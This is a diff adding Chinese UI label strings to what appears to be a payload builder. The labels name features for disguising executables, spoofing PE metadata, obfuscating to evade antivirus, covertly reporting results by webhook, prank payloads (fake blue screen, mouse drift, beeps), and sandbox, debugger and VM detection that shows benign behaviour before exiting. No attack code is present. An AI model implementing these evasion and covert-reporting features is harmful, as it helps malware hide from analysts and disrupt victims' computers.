@@ -20,6 +20,8 @@
     "sec_disguise": "伪装设置",
     "sec_meta": "元数据设置 (PE信息)",
     "sec_security": "安全选项",
+    "sec_webhook": "Webhook 追踪",
+    "sec_payloads": "恶搞载荷 (可选)",
     
     "lbl_template": "选择预设模板:",
     "lbl_select_template": "--- 选择模板快速填充 ---",
@@ -47,6 +49,23 @@
     "chk_obfuscation": "启用代码混淆 （随机化变量名 + 插入垃圾代码，降低杀软识别率）",
     "chk_signing": "启用代码签名（可选，需本机已安装 SignTool 并准备好 PFX 证书）",
     "msg_signing_hint": "提示: 签名密码仅本次构建使用，不会写入历史记录。",
+    
+    "chk_webhook": "启用 Webhook 战报回传（Launcher 执行结果推送到你的通知渠道）",
+    "lbl_webhook_type": "推送服务类型:",
+    "lbl_webhook_type_hint": "(Server酱 / 钉钉 / 飞书 / 通用JSON)",
+    "lbl_webhook_url": "Webhook URL:",
+    "msg_webhook_hint": "提示: Launcher 将在扫描结束后异步发送结果到此地址，不影响主流程。",
+    
+    "chk_bsod": "蓝屏伪装 — 未找到目标时显示高仿 Windows 蓝屏画面",
+    "chk_audio": "搞怪音效 — 后台播放蜂鸣音序列",
+    "lbl_audio_melody": "音效类型:",
+    "chk_mouse_drift": "鼠标漂移 — 让鼠标短时间不听使唤",
+    "lbl_drift_intensity": "漂移强度 (1-10):",
+    "lbl_drift_duration": "持续秒数:",
+    
+    "sec_anti_analysis": "反分析检测",
+    "chk_anti_analysis": "启用反分析 — 检测沙箱/调试器/虚拟机环境，异常时显示良性行为后退出",
+    "msg_anti_analysis_hint": "检测项: CPU核心数/内存/磁盘/运行时间/MAC地址/调试器/分析工具进程等 11 项指标",
     
     "btn_browse": "浏览",
     
